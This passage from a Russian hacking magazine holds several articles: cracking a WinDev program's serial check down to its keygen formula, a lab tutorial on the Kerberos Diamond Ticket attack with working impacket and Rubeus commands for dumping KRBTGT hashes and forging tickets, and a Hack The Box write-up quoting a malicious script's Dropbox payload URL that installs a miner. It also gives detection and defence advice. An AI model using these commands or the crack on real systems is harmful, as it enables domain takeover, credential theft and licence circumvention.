тически неизвестен. Зато, если загуглить по его названию, из выборки кар‐
тинок можно собрать набор длинноногих девиц для эротического журнала
средней степени целомудренности.
   Является ли это причиной, почему мировая закулиса усиленно задвигает
на задний план продукцию компании и ее фирменный язык программирова‐
ния WLanguage (или на французский манер — WLangage), — решать тебе,
а мы перейдем от лирики к практической задаче.
   Итак, у нас есть некое торговое приложение на очень экзотическом языке,
при запуске предлагающее ввести серийный номер в ответ на аппаратный ID.





Слегка нервирует тот факт, что формат кода неясен, а при вводе неправиль‐
ного значения ничего не происходит от слова совсем. Судя по размеру
запускаемого модуля (около 300 Кбайт), это просто лаунчер, не содержащий
в себе ничего интересного. Detect It Easy нам тоже не помощник — с такой
экзотикой это приложение незнакомо.
   Определить принадлежность пациента к нашей поликлинике мы можем
лишь по косвенным признакам: в комплект входит библиотека WD553HF.dll,
которая гуглится как «движок Hyper File версии 5.5 WinDev», а также весьма
увесистый файл с расширением .WDL, который, по информации с того же
сайта, представляет собой основную библиотеку проекта и содержит формы,
исполняемый шитый код и  прочие используемые  ресурсы. И наконец,
при беглом просмотре исполняемого файла в Hex-редакторе в юникодном
режиме мы видим множественные упоминания WinDev и его служебных биб‐
лиотек.





Обретенное знание нас мало радует: файл библиотеки .WDL при ближайшем
рассмотрении оказывается запакован или зашифрован, причем этот Джо
настолько неуловим, что нагуглить в паблике декомпилятор для актуальной
версии невозможно. Видимо, когда‑то давно исходный код WLanguage хра‐
нился прямо внутри exe-файла в явном виде (о чем свидетельствует наличие
весьма примитивного «декомпилятора», но сейчас эти счастливые времена
прошли, и нам снова приходится делать все самостоятельно.
   По‑хорошему надо бы разобрать формат WDL и написать собственный
декомпилятор, но (учитывая чуть менее чем никакую практическую полез‐
ность этого экзотического продукта) снова пойдем путем наименьшего соп‐
ротивления — попробуем найти код проверки серийного номера и написать
его генератор.
  Для этого загрузим нашу исследуемую программу в отладчик x32dbg и для
начала попробуем проследить судьбу текста, введенного нами в поле серий‐
ного номера. К сожалению, контролы у окна приложения сплошь кастомные,
поэтому брейк‑пойнты на функции GetWindowText, GetDlgItemText и им
подобные здесь совершенно не в тему.
   Попробуем совсем тупой способ: введем какой‑нибудь запоминающийся
серийник типа 0123456789876543210 и поищем его в памяти.
   Конечно, он находится в юникодном виде, причем сразу в нескольких
десятках мест. Не ленимся поставить точки останова на каждое из них и сразу
обламываемся — обращение к этим строкам идет постоянно, причем они
непрерывно передаются из переменной в переменную, старые значения
затираются, новые плодятся, поэтому отслеживать все ветки совершенно
бесполезно. Тем более мы еще даже не нажали кнопку регистрации. Идея
изначально была дурацкой, однако в ходе ее проверки мы делаем полезное
наблюдение: программа вовсю использует функцию msvcrt.dll.wsclen.
Не мудрствуя лукаво ставим на нее условную точку останова, чтобы отследить
все строки, проходящие через этот «строкомер».





Нажимаем кнопку регистрации и смотрим в журнал отладчика.





Легко догадаться, что раз программа проверяет длину всех строк подряд, то
в логируемый список вместе с содержимым  контролов попадают и их
заголовки, и даже их внутренние идентификаторы. Сложив два плюс два, мы
легко догадаемся, что идентификатор контрола, в который мы пытаемся
вбить  серийник, называется EDT_Seriali и в окне  присутствует некий
невидимый нам контрол EDT_Edit3, содержимое которого программа дер‐
гает при нажатии кнопки регистрации.
   Хранящаяся в нем строка 5652029 подозрительно напоминает серийный
номер, которым и оказывается при проверке, — введя это значение в поле
EDT_Seriali, мы обнаруживаем, что именно оно и ожидалось! Это было
чересчур просто и даже в некотором роде неспортивно, поэтому попробуем
все‑таки докопаться, каким образом нам удался этот фокус. Ведь в самом
деле, не будем же мы на каждом компьютере (а серийник, напоминаю,
зависит от аппаратного ID) заходить в отладчик и искать правильный номер?
Для  начала   попробуем   найти  самое   первое   упоминание   стро‐
ки 5652029 с момента запуска приложения. Для этого слегка модифицируем
точку останова.





Перезапускаем программу, затем поэтапно поднимаемся вверх по стеку
вызовов, внимательно следя за кодом, из которого вызывается каждая фун‐
кция. Буквально через несколько шагов мы возвращаемся в код, который
не принадлежит ни одному из загруженных модулей, более того, он даже
поиском по всем файлам приложения не находится.





Похоже на код, полученный в результате JIT-компиляции, а это именно то, что
мы ищем. Обрати внимание на значение регистра ecx — в нем хранится ука‐
затель на переменную, значение которой — 563E3D, то есть 5652029
в десятичном виде. Это и есть правильный серийник. Нам осталось при‐
думать, как зафиксировать  точку останова в этом неуловимом JIT-коде,
и отследить расчет нужной нам переменной.
   Первое, что приходит в голову, — выделить в этом коде некую жесткую
сигнатуру, последовательность байтов, которая не будет меняться в зависи‐
мости от адреса скомпилированного фрагмента, то есть не содержит в себе
адресов переменных и вызовов функций. Например, подходит такая пос‐
ледовательность, начиная с адреса 1A20B44 на предыдущем скриншоте:


89 47 1C 8B 7D 14 8B 47 18 8B 5F 1C 03 C3 0F 80

Теперь ставим точку останова на вызов откомпилированного JIT-кода.





После этого перезапускаем программу. При каждом останове на этом вызове
мы проверяем поиском по выбранной выше маске в памяти процесса,
не скомпилировался ли нужный фрагмент кода. Наши старания очень скоро
увенчаются успехом: буквально четвертый вызов ведет нас на искомый фраг‐
мент кода. Дальше все оказывается очень просто: команда imul по адресу
1A20B14 перемножает числа 0x6230 и 0xDE, а результат последовательно
суммируется с числами 0x117BF и 0xDE, в итоге и получается искомое число
0x563E3D (5652029). Откуда берутся числа 0x6230 и 0x117BF, даже и доис‐
киваться не надо — это шестнадцатеричные представления числовых частей
системного ID 25136-LAN-71615. Надо сказать, авторы программы довольно
халтурно подошли к формированию серийного номера, явно понадеявшись
на закрытость кода и отсутствие декомпиляторов в паблике, но нам в целях
обучения такой простой пример идеален.
   Итак, мы нашли простое решение простой задачи, однако тебе наверняка
могут попасться задачи и посложнее. Какие направления их решения можно
сразу наметить? Для начала — автопатчинг JIT-скомпилированного кода. Нам
ведь известна (и мы имеем представление, как ее найти) точка входа ском‐
пилированной функции  (см. последний  скриншот), можно ее  запатчить
на предмет контроля подгружаемого кода и автоматизировать этот процесс.
  Еще один вариант — найти JIT-компилятор и озадачить автопатчингом
именно его. С другой стороны, если ты найдешь JIT-компилятор и разберешь
принцип его работы, то что (кроме наличия свободного времени, усидчивос‐
ти и достойной мотивации) мешает тебе написать нормальный декомпилятор
с этой французской вундервафли и облегчить задачу следующим поколениям
хакеров?
ВЗЛОМ





Атака «Алмазный билет» (Diamond Ticket) — это новое слово
в мире эксплуатации Active Directory (AD). Она завязана
на хитроумные недочеты в аутентификации и авторизации
Kerberos. В этой статье мы разберем все технические тон‐
кости этой  атаки: выясним, какую роль играют  Privilege
Attribute Certificates (PAC), и узнаем, почему окружение AD
так  уязвимо.  Напоследок  вооружим  тебя  подробными
советами по обнаружению угрозы.


             INFO

                      Это перевод материала Diamond Ticket Attack:
                        Abusing kerberos Trust из блога Hacking Articles.
                       Автор — Комаль Сингх. Этот материал доступен
                       без платной подписки.


Для начала разберемся с основами: в атаке на Domain PAC (Privilege Attribute
Certificate) злоумышленник подделывает или изменяет PAC внутри билета
Kerberos. В  результате  злодей  получает  несанкционированный  доступ
или повышает свои привилегии в доменной среде. Это работает из‑за того,
что многие сервисы по умолчанию доверяют PAC, часто не проверяя его под‐
линность и не сопоставляя с данными Key Distribution Center (KDC).
   Атака Diamond Ticket — более продвинутый вариант. Здесь злоумыш‐
ленник внаглую лезет в сами билеты Kerberos — в первую очередь Ticket
Granting  Tickets  (TGTs) и PAC. Подделанные билеты  используют,  чтобы
повысить привилегии в домене Active Directory (AD).


МЕХАНИЗМ АТАКИ

Для начала атаки злоумышленник подделывает PAC, чтобы добавить туда
повышенные привилегии или фальшивые группы (например, «Администра‐
торы домена»).
   После  этого  поддельный  билет  с  измененным  PAC  отправляется
на целевой сервис.
  В классической «бриллиантовой» атаке злоумышленник сперва исполь‐
зует хеш KRBTGT AES, чтобы расшифровать рабочий билет TGT  (Ticket
Granting Ticket). Далее он меняет PAC (Privilege Attribute Certificate) внутри TGT
и, наконец, снова шифрует измененный TGT с тем же хешем KRBTGT AES, так,
чтобы тот выглядел легитимным.
  По сути, это атака на модификацию TGT. Хакер не будет заморачиваться
кражей исходного TGT или созданием нового с нуля. Ему достаточно просто
поковыряться в PAC внутри уже существующего TGT и изменить его под свои
нужды.


АТАКА ПО ШАГАМ

Вот шаги, которые предпринимаются при проведении атаки Diamond Ticket:
 • Получение AES-хеша учетной записи KRBTGT. Для начала зло‐
   умышленник компрометирует учетную запись KRBTGT — обычно это дела‐
   ется через дамп хешей с контроллера домена или получение доступа
   к важной информации контроллера.
 • Дешифровка TGT с помощью AES-хеша KRBTGT. Атакующий
   использует AES-хеш аккаунта KRBTGT, чтобы дешифровать валидный TGT.
   Когда TGT успешно расшифрован, в нем обнаруживается PAC — он несет
   информацию о привилегиях пользователя, членстве в группах и другую
   важную инфу.
 • Изменение PAC. Расшифровав TGT, злоумышленник может поколдовать
   над PAC, чтобы вписать себе новые атрибуты или привилегии. В итоге он
  может добавить себя в такие элитные группы, как Domain Admins, или сме‐
   нить членство в группах, чтобы прокачать свои права до небес.
 • Перешифровка измененного TGT с использованием AES-хеша
  KRBTGT. Как только злоумышленник поменяет PAC по своему вкусу, он
   перешифровывает TGT с помощью хеша KRBTGT AES, чтобы получить
   новый валидный TGT. Эта перешифровка заставляет измененный TGT выг‐
   лядеть легитимным для системы Kerberos.
 • Применение модифицированного TGT. Атакующий теперь может
   предъявить модифицированный TGT, чтобы получить доступ к ресурсам,
   как будто он привилегированный пользователь, обходя обычные механиз‐
  мы контроля доступа.
 • TGS (Service Ticket). Тикеты TGS выдаются на основе TGT. Они сами
   по себе PAC не хранят, а используют PAC из TGT, чтобы проверить твою
   личность и права.

В этом варианте атаки манипуляция происходит, еще когда TGS не задей‐
ствован, потому что подделанный TGT используется для запроса сервисного
тикета с повышенными привилегиями.


СТРУКТУРА ТИКЕТОВ

TGT (Ticket Granting Ticket)
TGT — это штука, которую тебе выдает Authentication Server (AS). Она нужна,
чтобы потом штурмовать Ticket Granting Service (TGS) для получения сер‐
висных билетов. Обычно у нее внутри лежит следующее:
 • Заголовок — версия и тип тикета.
 • Информация о клиенте — имя пользователя и область (например,
  user@DOMAIN.LOCAL).
 • Session Key — ключик, который делят между собой клиент и KDC. Он
   нужен, чтобы шифровать общение.
 • PAC  (Privilege  Attribute  Certificate) включает в себя все данные
  о пользователе:
    • прописка в группах;
    • привилегии (типа админских прав);
    • SID аккаунта (Security Identifier) — уникальный идентификатор безопас‐
      ности.
 • Временная метка и срок действия — период валидности билета
   (время начала, время истечения).
 • Шифрование KRBTGT — TGT зашифрован и подписан с использовани‐
  ем хеша KRBTGT (AES или RC4), чтобы только KDC мог его читать и про‐
   верять.


TGS (сервисный тикет)
Давай разберемся, как устроен сервисный тикет TGS. Он выдается сервером
Ticket Granting Service на основе TGT и используется для доступа к конкрет‐
ным сервисам. В его структуру входит:
 • Информация о заголовке — версия тикета и его тип.
 • Информация о клиенте — имя пользователя и область.
 • Session Key — уникальный ключ для безопасного общения между кли‐
   ентом и целевой службой.
 • Информация о сервисе — Service Principal Name (SPN), который опре‐
   деляет целевой сервис (например, HTTP/WEBSERVER.DOMAIN.LOCAL).
 • PAC (Privilege Attribute Certificate) — берется из TGT и применяется
   сервисом, чтобы удостовериться, что пользователь — это тот, за кого он
   себя выдает, и проверить, какие у него есть права.
 • Временная метка и срок действия — период, в течение которого
   сервисный тикет считается валидным.
 • Зашифрованный  сервисный  ключ —  шифрование  происходит
   при помощи ключа сервисного аккаунта (хеш пароля или ключевой
   материал SPN).


ВАЛИДАЦИЯ PAC

Проверка PAC (Privilege Attribute Certificate) в Kerberos обеспечивает легитим‐
ность личности и привилегий пользователя, который аутентифицировался
через Kerberos. PAC содержит инфу о принадлежности юзера к группам, его
SID (Security Identifier) и другие данные для авторизации.


AS-REQ и AS-REP
 • Клиент отправляет AS-REQ в центр распределения ключей (KDC), чтобы
   получить билет‑допуск (TGT).
 • KDC выдает TGT в AS-REP, вкладывая PAC в зашифрованную часть тикета.


TGS-REQ и TGS-REP
 • Клиент отправляет TGS-REQ на KDC, используя свой TGT для запроса
   тикета на доступ к конкретному ресурсу.
 • KDC отвечает пакетом TGS-REP, в который вложен PAC.


AP-REQ (запрос приложения)
 • Клиент отправляет TGS (включая PAC) на целевой сервис.


Валидация PAC на стороне сервиса
 • Если  сервис  доверяет KDC, он может напрямую использовать PAC
   без проверки.
 • Если нужно проверить PAC, сервис отправляет его на контроллер домена
   для верификации.


Подробности проверки PAC
 • Сервис отсылает PAC контроллеру домена, используя проверку подписи
   Kerberos.
 • Контроллер домена (DC) проверяет цифровую подпись PAC (выполненную
   с помощью приватного ключа KDC), чтобы убедиться в ее целостности
   и подлинности.
 • Если всё окей, то DC шлет подтверждение сервису.


AP-REP (ответ приложения)
 • После проверки PAC служба либо дает доступ, либо отказывает, осно‐
   вываясь на правах юзера.


ОГРАНИЧЕНИЯ PAC-ВАЛИДАЦИИ

Главный косяк в аутентификации с Kerberos PAC — отсутствие проверки
PAC сервисами. Часто случается так, что сервисы бездумно доверяют PAC,
встроенному в билеты Kerberos, не сверяясь с подписью KDC или контрол‐
лера домена (DC). Как результат, злоумышленники могут:
 • создавать PAC офлайн, взломав учетные данные (например, хеш NTLM
   или ключи Kerberos);
 • создавать фейковый TGS-билет (Ticket Granting Service), не связываясь
   с KDC;
 • использовать уязвимость в модели доверия, где сервис слепо принимает
   тикет, предоставляя несанкционированный доступ.

Проблемы, к которым это может привести:
 • Манипуляция моделью доверия Kerberos — сервисы считают PAC
   подлинным и пропускают валидацию.
 • Офлайн‑подделка — атаки совершаются в обход KDC, и отследить их
   крайне сложно.
 • Зависимость — украденные ключи или хеши учетных записей сервисов
   позволяют генерировать тикеты.


ЧТО НУЖНО ДЛЯ АТАКИ

 • Хеш аккаунта KRBTGT — играет ключевую роль при дешифровке
   и решифровке TGT.
 • Ключ AES256 — частенько требуется, чтобы ковыряться в PAC внутри
   TGT.
 • Административный доступ — нужен доступ к аккаунту с высокими при‐
   вилегиями, чтобы стянуть оттуда криптографический материал.

Давай теперь подготовим стенд, на котором сможем воспроизвести атаку.
  В доменном контроллере создаем двух пользователей: Raaz с правами
доменного админа и Sanjeet — обычный пользователь.


net user raaz Password@1 /add /domain
net group raaz "Domain Admins" /add /domain





Эта команда добавляет пользователя Raaz к группе Domain Admins на уровне
домена. Теперь у Raaz есть полный контроль над доменом, как у настоящего
хакера.
   Будь осторожен с такими командами — они выдают большие полномочия
и могут привести к серьезным последствиям, если попадут не в те руки.


net user sanjeet Password@1 /add /domain





УДАЛЕННАЯ АТАКА DIAMOND НА LINUX

Как мы уже обсудили, чтобы провернуть эту атаку, злоумышленнику нужно
завладеть хешем KRBTGT. Представим, что в нашей гипотетической ситуации
он сумел скомпрометировать учетку с высокими привилегиями, скажем RAAZ-
User. Используя этот доступ, атакующий решает провернуть атаку DCSync,
чтобы вытянуть хеш аккаунта KRBTGT.


Извлекаем хеш KRBTGT и SID домена
Вот как будет выглядеть команда:


impacket-secretsdump ignite.local/raaz:Password@1@192.168.1.48 -just-
dc-user krbtgt

На следующей картинке выделены хеши NTLM и AES служебной учетной
записи KRBTGT.





Теперь узнаем SID для пользователя Raaz.


nxc ldap 192.168.1.48 -u raaz -p Password@1 –get-sid





Создаем поддельный TGS и PAC
Злоумышленник подделывает сервисный тикет для пользователя Sanjeet,
повысив его привилегии и снабдив валидной подписью. При этом он хитро
обходит валидацию PAC на контроллере домена.


impacket-ticketer -request -domain 'ignite.local' -user 'sanjeet' -
password 'Password@1' -nthash '761688de884aff3372f8b9c53b2993c7' -
aesKey
'8e52115cc36445bc520160f045033d5f40914ce1a6cf59c4c4bc96a51b970dbb' -
domain-sid 'S-1-5-21-798084426-3415456680-3274829403' sanjeet

Здесь
 • -domain 'ignite.local' определяет целевое доменное имя для ата‐
   ки;
 • -user 'sanjeet' — имя пользователя, для которого создается под‐
   дельный тикет;
 • -password  'Password@1' — пароль  пользователя,  нужный,  чтобы
   вытащить криптографические ключи для генерации PAC или тикета (эта
   часть обычно не так важна в атаках типа «Серебряный билет»);
 • -nthash и -aesKey относятся к учетной записи KRBTGT, нужны для атаки
   типа Diamond Ticket. Они используются для криптографической подписи
   и проверки поддельного сервисного тикета;
 • -domain-sid  'S-1-5-21-79...03' —  уникальный  идентификатор
   домена. Нужен при конструировании PAC;
 • sanjeet указывает на SPN (Service Principal Name) или имя пользователя,
   которое атакующий использует, чтобы притвориться Санжитом и получить
   доступ к разным сервисам.


Pass the Ticket
В этом случае переменная окружения указывает системе использовать кон‐
кретный файл кеша учетных данных Kerberos (sanjeet.ccache) для аутен‐
тификации.
  В файле sanjeet.ccache хранятся билеты Kerberos для пользователя
Sanjeet, и, скорее всего, там можно найти билет доступа к нужному сервису
(TGS) для выбранной цели.


export KRB5CCNAME=sanjeet.ccache; impacket-psexec ignite.local/
sanjeet@dc.ignite.local -dc-ip 192.168.1.48 -target-ip 192.168.1.48 -
k -no-pass

Разберем параметры:
 • impacket-psexec —  инструмент из  библиотеки  Impacket, который
   по SMB дает тебе возможность удаленно запускать команды на Windows-
   машинах;
 • ignite.local/sanjeet@dc.ignite.local — имя главного объ-
  екта Kerberos (user@realm), которое используется для аутентификации.
   Здесь local — это домен, sanjeet — имя пользователя, ignite.
  local — хостнейм нашего контроллера домена;
 • -dc-ip 192.168.1.48 — этот параметр указывает IP-адрес контрол‐
   лера домена, с которым ты хочешь взаимодействовать;
 • -target-ip 192.168.1.48 — IP-адрес целевой системы, где будет
   выполняться команда. В данном случае это тот же адрес, что и у контрол‐
   лера домена;
 • -k — указывает, что будет применена аутентификация Kerberos вместо
   устаревшего NTLM. Утилита заберет Kerberos-билеты из указанного кеша
   учетных данных (KRB5CCNAME);
 • no-pass — сообщает инструменту не запрашивать пароль, потому что
   аутентификация будет выполнена с помощью Kerberos-билетов, которые
   уже лежат в кеше.



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   АЛМАЗНЫЙ БИЛЕТ
           КАК ИСПОЛЬЗОВАТЬ ДОВЕРИЕ
             KERBEROS В СВОИХ ЦЕЛЯХ





ЛОКАЛЬНАЯ АТАКА НА WINDOWS

Если злоумышленник проник на локальный компьютер с Windows, то он может
прибегнуть к таким инструментам, как Mimikatz и Rubeus.


Извлечение хеша KRBTGT
Команда, которую я приведу ниже, вытягивает NTLM-хеш и ключи шиф‐
рования AES учетной записи KRBTGT из целевого домена. Эти хеши исполь‐
зуются в атаках Golden Ticket и Diamond Ticket для подделки билетов Kerberos.





Чтобы было нагляднее, вот пример команды, демонстрирующей исполь‐
зование Rubeus (это утилита для оперирования с билетами Kerberos в Active
Directory). Эта конкретная команда проводит атаку Diamond Ticket, которая
позволяет злоумышленнику прикинуться нужным юзером.


rubeus.exe diamond /krbkey:
8e52115cc36445bc520160f045033d5f40914ce1a6cf59c4c4bc96a51b970dbb /
user:sanjeet /password:Password@1 /enctype:aes /domain:ignite.local /
dc:dc.ignite.local /ticketuser:sanjeet /ptt /nowrap

В этой атаке происходит подделка сервисных билетов при помощи ключей
шифрования KRBTGT. Разберем параметры:
 • krbkey:8e5...dbb —  этот  оператор  указывает AES-ключ KRBTGT,
   который нужен для шифрования и подписи билета Kerberos. Это самый
   важный параметр для создания валидного сервисного тикета;
 • /user:sanjeet — имя пользователя, от которого будет производиться
   работа во время операции;
 • /password:Password@1 — пароль для указанного пользователя. Сис‐
   тема использует этот пароль для аутентификации и, возможно, получения
   ключей шифрования или TGT;
 • /enctype:aes — тип шифрования для билета Kerberos. В этом случае
   используется шифрование AES — популярный вариант в современных
   реализациях Kerberos для усиления защиты;
 • /domain:ignite.local  —   целевой   домен     (ignite.local),
   для которого предназначен поддельный билет;
 • /dc:dc.ignite.local — система коннектится к Domain Controller (dc.
  ignite.local) в процессе создания тикета;
 • /ticketuser:sanjeet — фальшивый билет Kerberos сделан так, чтобы
   выдать себя за юзера Sanjeet;
 • /ptt — атака Pass the Ticket. Сгенерированный билет автоматически
   встраивается в текущую сессию, чтобы моментально сработать при аутен‐
   тификации;
 • /nowrap — эта настройка не позволяет выводу в консоли переноситься
   на новую строку. Улучшает читаемость.





От TGT к TGS
Теперь программа сольет TGT-билет, который пригодится для запроса TGS.





rubeus.exe asktgs /ticket: <вставь сюда скопированный ранее тикет> /
service:cifs/dc.ignite.local /ptt /nowrap





klist
Эта команда выведет на экран все закешированные на данный момент
билеты Kerberos.





В этом сценарии атакующий запускает команду на Windows, чтобы получить
список содержимого диска C: удаленной машины. Чтобы указать ее, нужно
задать имя хоста или IP-адрес.


dir \\dc.ignite.local\c$





МЕТОДЫ ОБНАРУЖЕНИЯ

Вот список ID ключевых событий:
 • 4769 (запрос сервисного билета) — можно детектировать использование
   поддельных TGT. Признаки: странные имена аккаунтов, высокие права
   (например, администраторы домена) и запросы с неожиданных IP.
 • 4624 (успешный вход в систему) — ищи события с Logon Type 3 (сетевые
   входы) с неожиданных хостов или с повышенными привилегиями у учеток,
   которые не тянут на админа.
 • 4678 (привилегии, назначенные при входе) — позволяет отслеживать
   момент, когда обычным юзерам вдруг прилетают спецпривилегии (нап‐
   ример, SeDebugPrivilege).
 • 4713 (изменение политики Kerberos) — изменены флаги времени жизни
   тикетов или другие параметры политики Kerberos.
 • 4625 (неудачная авторизация) — повторяющиеся фейлы входа от имени
   привилегированных учеток или с подозрительных IP-адресов.

Стратегии обнаружения:
 • Время жизни тикета: сравни время жизни тикета в событии с ID
   4769 с нормами политики, чтобы выловить аномалии.
 • Привязка привилегий: отслеживай повышенные привилегии или доступ
   к чувствительным SPN у обычных юзеров.
 • Нетипичное шифрование: обращай внимание на редкое шифрование,
   вроде RC4, в событиях с ID 4769.
 • Использование TGT: следи за одинаковыми TGT, которые применяются
   на разных IP или с разных мест.

Проактивные приемы:
 • Включи логирование Kerberos, чтобы увидеть все в подробностях.
 • Проверь изменения в группах с высокими привилегиями (ID событий 4728,
   4732).
 • Регулярно меняй пароли учетной записи KRBTGT.

Пример запроса для SIEM:


index=security_logs sourcetype=wineventlog EventID=4769


| search ServiceName IN ("Domain Admins", "Enterprise Admins")
| stats count by AccountName, IPAddress, ServiceName
| where count > 5


КАК ЗАЩИТИТЬСЯ?

Превентивные меры:
 • Меняй пароль учетной записи KRBTGT. Постоянно обновляй пароль
   у KRBTGT дважды, чтобы аннулировать закешированные тикеты.
 • Внедряй современное шифрование. Забудь про старые протоколы
   типа RC4-HMAC и используй AES256.
 • Ограничь эскалацию привилегий. Используй принципы минимальных
   привилегий, чтобы уменьшить уязвимость.

Реагирование на инцидент:
 • Обнуление  активных  тикетов:  мгновенно меняй  ключи KRBTGT
   и выкидывай всех пользователей из системы.
 • Форензика: используй такие инструменты, как BloodHound, чтобы пос‐
   троить траекторию повышения привилегий и выявить взломанные акка‐
   унты.


ВЫВОДЫ

Возможность атаки Diamond Ticket должна подтолкнуть админов не забывать
о  безопасности  аутентификации  Kerberos  в  Active  Directory.  Если  ты
как защитник разберешься в технических деталях и устранишь коренные при‐
чины   уязвимостей,  твоя  компания  сможет  всерьез  снизить  риски
перед лицом этой угрозы.
ВЗЛОМ





Сегодня мы шаг за шагом пройдем про‐
цесс  анализа  инцидента: по собранным
артефактам узнаем подробности о подоз‐
рительной активности, а затем изучим код
вредоноса по изменениям на GitHub. Осо‐             sab3rt1le                                                                                        FORensics FOR fun ;)
бое внимание уделим практическому при‐             @k0n70r4
менению  методологии  MITRE  ATT&CK
и     использованию     OSINT-методов
для детального исследования инцидента.


Мы  будем  проходить  лабораторную  работу  Psittaciformes  из  раздела
Sherlocks на площадке Hack The Box.
   Вот как звучит предложенный автором лабы сценарий:


      Служба внутренней безопасности компании Forela провела тестирова-
      ние на проникновение в ее сеть. В результате тестирования было«
       обнаружено, что один из узлов, возможно, был взломан.                »
Цель расследования — проверить, как произошла компрометация, используя
предоставленные данные.


ПОИСК АНОМАЛЬНОЙ АКТИВНОСТИ

Распакуем и прошерстим файлы из задания. Нет ли среди них папок с подоз‐
рительными названиями? Особое внимание уделяем каталогам пользовате‐
ля.
  В корневой папке есть каталог User_Files, который содержит архив
с интересным названием hidden-user-home-dir.tar.gz. В нем — каталоги
home/ и root/.





В домашней директории находим папку пользователя johnspire, который
предположительно был скомпрометирован. Просмотрим историю команд,
чтобы убедиться в этом.





Видим, что под учеткой выполнялась подозрительная активность, в том числе
сканирование  сети, просмотр /etc/passwd, запуск MSF.  Примечателен
запуск Git и использование скрипта enum.sh. Посмотрим на GitHub засветив‐
шийся репозиторий autoenum.





В README  написано NA  (not  available),  что  подразумевает  отсутствие
каких‑либо сведений. Разберем подробнее запускавшийся на хосте enum.sh.





АНАЛИЗ ENUM.SH

Внимание привлекает функция do_wget_and_run(), которая и является вре‐
доносной. В ней содержится ссылка на Dropbox, составляемая из двух
переменных:


f1="https://www.dropbox.com/scl/fi/uw8oxug0jydibnorjvyl2"
f2="/blob.zip?rlkey=zmbys0idnbab9qnl45xhqn257&st=v22geon6&dl=1"

C сайта скачивается ZIP-архив с достаточно тривиальным паролем, тоже сос‐
тоящим из двух по отдельности кодированных Base64 частей.





Не было ли у этого скрипта более ранних версий? Чтобы это узнать, перехо‐
дим в раздел Activity на странице репозитория.





Здесь отображены все изменения, внесенные в проект (плюсом отмечены
новые строчки кода, минусом — удаленные): какой пользователь вносил эти
изменения и когда. Например, в коммите с SHA 7d20...5f видим удаленные
комментарии к частям вредоносной функции.





Чтобы уточнить временную метку, воспользуемся командой git  log  --
pretty=oneline. Она используется в Git для отображения истории коммитов
в укороченном формате, где каждый коммит представлен одной строкой.
Это удобно для быстрого просмотра истории изменений.





Команда git show в Git используется для отображения подробной информа‐
ции о конкретном объекте в репозитории, в том числе его временной метки.
Чаще всего она применяется для просмотра данных о коммитах, но также
показывает информацию о тегах, деревьях (tree) и файлах (blob).





Из интересного в этом кейсе видим смену ссылки на Dropbox в коммите
с SHA 5d88...7b.





GitHub, как одна из крупнейших платформ для совместной разработки, часто
становится инструментом для распространения вредоносного кода. Зло‐
умышленники могут использовать репозитории для хранения и распростра‐
нения вредоносных скриптов, эксплоитов или фишинговых инструментов.
История активности таких репозиториев — ценный источник информации.
   Каждый коммит в Git содержит информацию о внесенных изменениях,
авторе и времени. Используя команду git log, получим полную историю
коммитов репозитория. Это позволяет:
 1. Определить этапы разработки вредоносного кода: например, когда были
   добавлены ключевые функции или исправлены уязвимости.
 2. Выявить подозрительные паттерны: например, массовое удаление файлов
   или добавление зашифрованных данных.
 3. Связать коммиты с реальными инцидентами, сравнивая даты коммитов
   с временем атак или утечек данных.

Команда git show позволяет детально изучить изменения, внесенные в кон‐
кретном коммите. Это особенно полезно для изучения вредоносного кода,
поиска скрытых данных и выявления подозрительных файлов.
   Также злоумышленники могут использовать ветки и теги для организации
своей работы. Например:
 • Ветки для тестирования. Вредоносный код может разрабатываться
   в отдельных ветках, а затем сливаться в основную.
 • Теги для версификации. Теги могут указывать на версии вредонос‐
   ного ПО, что помогает отследить его эволюцию. Используя команды git
  branch -a и git tag , получим список всех веток и тегов, а затем изучим
   их содержимое.

Для более глубокого анализа используй специализированные инструменты:
 • GitHub API. Для автоматизации сбора данных о репозитории, включая
   коммиты, проблемы и пул‑реквесты.
 • Инструменты  статического  анализа  кода.  Например,  Bandit
   для Python или Semgrep для поиска уязвимостей.
 • OSINT-инструменты. Для поиска связей между авторами репозитория
   и другими аккаунтами в сети.


ЗАКРЕПЛЕНИЕ ЧЕРЕЗ CRON

Снова обратим внимание на enum.sh. В той же вредоносной функции есть
действия по закреплению с помощью Cron.





Это,  согласно MITRE,  относится  к  подтехнике  закрепления в  системе
T1053.003.


Классификация
Техника MITRE T1053.003, известная как Cron, относится к использованию
планировщика задач Cron в Unix-подобных системах для выполнения команд
или скриптов по расписанию. Злоумышленники могут использовать эту тех‐
нику для выполнения вредоносного кода с определенной периодичностью
или для закрепления в системе после компрометации.


Давай разберем, что за файл blob был доставлен, распакован и закреплен
в системе. В каталогах его не найти, поэтому воспользуемся артефактами
из триажа. В папке Misc есть документ exec-perm-files.txt, в котором
отображены все файлы с правами на выполнение и их хеш‑суммами.





Заливаем хеш на VirusTotal и видим, что образец действительно вредоносен.
Перейдем на вкладку Behavior, чтобы уточнить его вид и предназначение.





Согласно MITRE, основное воздействие blob связано с техникой T1496,
а исходя из строки reference cryptocurrency strings, можем заключить, что
это майнер криптовалюты.


Классификация
Техника T1496 (Resource Hijacking) описывает захват злоумышленниками сис‐
темных или сетевых ресурсов для выполнения вредоносных задач, таких
как майнинг криптовалюты, проведение DDoS-атак или выполнение сложных
вычислений, что приводит к несанкционированному использованию CPU,
GPU или пропускной способности сети, снижению производительности сис‐
темы и увеличению энергопотребления.



ВЫВОДЫ

В ходе анализа мы проследили полную цепочку атаки: от начального доступа
через учетную запись пользователя johnspire до закрепления в системе
с помощью планировщика cron и установки майнера криптовалюты.
   Исследование  истории  изменений  в  GitHub-репозитории  позволило
выявить эволюцию вредоносного скрипта enum.sh и определить точные вре‐
менные метки внесения критических изменений.
   Использование специализированных инструментов Git и анализ поведе‐
ния  файла blob  помогли  классифицировать  атаку по  техникам MITRE
T1053.003 и T1496.
ВЗЛОМ





Прочитав статью, ты узнаешь, как законо‐
дательство смотрит на дизассемблирова‐
ние  чужого  кода  и  как  не  попасть
под нарушение DMCA. Мы изучим юри‐
дическую практику на примере таких про‐             mr.grogrig                                                                                            mr.grogrig@gmail.com
ектов, как Wine, ReactOS, ScummVM, а так‐
же воссозданного игрового движка GTA 3.


ЮРИДИЧЕСКИЕ ЛАЗЕЙКИ

В каждой стране свои законы об авторском праве. Мы будем говорить пре‐
имущественно о США, так как в Штатах такие законы предельно строгие.
Если удалось обойти их там, вероятно, это сработает и в странах с куда более
свободным законодательством.
   Обычный реверс‑инжиниринг подразумевает восстановление исходного
